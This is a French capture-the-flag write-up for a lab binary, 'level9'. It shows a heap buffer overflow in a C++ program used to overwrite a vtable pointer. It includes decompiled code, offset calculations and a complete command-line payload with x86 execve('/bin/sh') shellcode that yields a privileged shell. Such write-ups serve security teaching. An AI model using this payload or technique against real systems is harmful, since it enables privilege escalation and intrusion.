# LEVEL 9

## 1. Introduction

Le binaire `level9` présente une vulnérabilité de **buffer overflow** dans un programme **C++** avec **exploitation de vtable**. Le programme utilise des objets C++ avec des méthodes virtuelles, et nous devons exploiter un `memcpy()` non contrôlé pour écraser la vtable et rediriger l'exécution vers notre shellcode.

## 2. Analyse

### 2.1 Droits du binaire
```bash
$ ls -la level9
-rwsr-s---+ 1 level10  level9  747441 Mar  6  2016 level9
```

### 2.2 Analyse des protections
```bash
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level9/level9
```

**Points clés :**
- **No RELRO** : Pas de protection contre l'écrasement de la GOT
- **No canary** : Pas de protection contre buffer overflow
- **NX disabled** : Exécution de code sur la heap possible
- **No PIE** : Adresses fixes (pas d'ASLR)

### 2.3 Analyse du code source

En décompilant le binaire, on observe la structure suivante :

```cpp
/* N::setAnnotation(char*) */
void __thiscall N::setAnnotation(N *this, char *param_1) {
    size_t __n;
    
    __n = strlen(param_1);
    memcpy(this + 4, param_1, __n);  // ← Vulnérabilité !
    return;
}

void main(int param_1, int param_2) {
    N *this;
    undefined4 *this_00;
    
    if (param_1 < 2) {
        _exit(1);
    }
    this = (N *)operator.new(0x6c);       // Alloue objet 1 (108 bytes)
    N::N(this, 5);                        // Constructeur avec paramètre 5
    this_00 = (undefined4 *)operator.new(0x6c);  // Alloue objet 2 (108 bytes)
    N::N((N *)this_00, 6);                // Constructeur avec paramètre 6
    N::setAnnotation(this, *(char **)(param_2 + 4));  // ← Appel vulnérable !
    (**(code **)*this_00)(this_00, this); // ← Appel de méthode virtuelle !
    return;
}
```

**Points clés :**
- Programme **C++** avec objets et méthodes virtuelles
- `memcpy()` sans vérification de taille = vulnérabilité buffer overflow
- Deux objets alloués avec `operator.new(0x6c)` (108 bytes chacun)
- Appel de méthode virtuelle via **vtable** (notre cible)

### 2.4 Vulnérabilité identifiée

La vulnérabilité se trouve dans `N::setAnnotation()` :
- `memcpy(this + 4, param_1, strlen(param_1))` copie sans limite
- Peut déborder et écraser le second objet
- Le second objet contient une **vtable** pointant vers des méthodes virtuelles
- L'appel `(**(code **)*this_00)(this_00, this)` utilise cette vtable

## 3. Exploitation

### 3.1 Étape 1 : Compréhension de la vulnérabilité

```
┌─────────────────┐
│   Objet 1       │ ← this (108 bytes)
│   [vtable][data]│   memcpy(this + 4, ...) peut déborder
├─────────────────┤
│   Objet 2       │ ← this_00 (108 bytes)
│   [vtable][data]│   Cible à écraser
└─────────────────┘
```

### 3.2 Étape 2 : Stratégie d'exploitation

1. **Placer le shellcode** au début de notre payload
2. **Calculer l'offset** pour atteindre la vtable du second objet
3. **Écraser la vtable** pour qu'elle pointe vers notre shellcode
4. **Déclencher l'appel** de la méthode virtuelle

### 3.3 Étape 3 : Construction du payload

```bash
# Structure du payload :
# [Adresse shellcode][Shellcode][Padding][Adresse vers shellcode]
```

**Calculs :**
- Premier objet : 108 bytes
- Offset vers vtable du second objet : 108 bytes
- Shellcode : 28 bytes
- Padding : 108 - 4 - 28 = 76 bytes

### 3.4 Commandes complètes

```bash
# Se connecter au niveau
ssh level9@<IP> -p 4242

# Exécuter l'exploit
./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\x04\x08"')
```

## 4. Structure du Payload

### 4.1 Ce qui se passe concrètement

```
┌─────────────────────────────────────────────────────────┐
│              C++ VTABLE OVERWRITE                      │
├─────────────────────────────────────────────────────────┤
│  Adresse[4] + Shellcode[28] + Padding[76] + Vtable[4] │
│  │                                                    │
│  └─→ \x10\xa0\x04\x08 + shellcode + "A"*76 + \x0c...│
│      │                                                │
│      └─→ memcpy() déborde objet 1 → écrase objet 2   │
│          │                                            │
│          └─→ Vtable du second objet pointe vers      │
│              │                                        │
│              └─→ Notre shellcode dans l'objet 1      │
│                  │                                    │
│                  └─→ (**(code **)*this_00)() exécute │
│                      │                               │
│                      └─→ system("/bin/sh")           │
└─────────────────────────────────────────────────────────┘
```

### 4.2 Structure de la mémoire heap

```
┌─────────────────┐  Adresse 0x804a008
│   Vtable ptr    │  ← Pointeur vers vtable (4 bytes)
├─────────────────┤  Adresse 0x804a00c
│   Data (104)    │  ← Notre shellcode ici
│   \x10\xa0\x04  │
│   \x08 + shell  │
│   code + pad    │
└─────────────────┘  Fin objet 1
┌─────────────────┐  Début objet 2
│   Vtable ptr    │  ← Écrasé avec 0x804a00c
├─────────────────┤
│   Data (104)    │
└─────────────────┘
```

### 4.3 Exploitation vtable

```
┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
│   Buffer        │    │   Vtable        │    │   Shellcode     │
│   Overflow      │───▶│   Overwrite     │───▶│   Execution     │
│   memcpy()      │    │   → shellcode   │    │   system("/sh") │
└─────────────────┘    └─────────────────┘    └─────────────────┘
```

### 4.4 Flux d'exécution

```
1. Programme alloue deux objets N (108 bytes chacun)
2. memcpy() copie notre payload dans objet 1 à partir de l'offset +4
3. Le payload déborde et écrase la vtable du second objet
4. (**(code **)*this_00)() appelle la méthode virtuelle
5. La vtable pointe maintenant vers notre shellcode
6. Le shellcode s'exécute et lance system("/bin/sh")
7. Shell s'ouvre avec les privilèges SUID de level10
```

### 4.5 Visualisation de l'exploitation

```
┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
│   C++ Object    │    │   Vtable        │    │   Virtual Call  │
│   memcpy()      │───▶│   Overwrite     │───▶│   → shellcode   │
│   overflow      │    │   0x804a00c     │    │                │
└─────────────────┘    └─────────────────┘    └─────────────────┘
```

### 4.6 Mécanisme de vtable overwrite

```
┌─────────────────┐
│ Adresse shell   │ ← \x10\xa0\x04\x08 (début payload)
├─────────────────┤
│ Shellcode[28]   │ ← Code à exécuter
├─────────────────┤
│ Padding[76]     │ ← Pour atteindre vtable objet 2
├─────────────────┤
│ Vtable ptr      │ ← \x0c\xa0\x04\x08 (vers shellcode)
└─────────────────┘
```

## 5. Conclusion

Cette exploitation démontre les vulnérabilités spécifiques au C++ et l'importance de la validation des entrées dans les langages orientés objet. 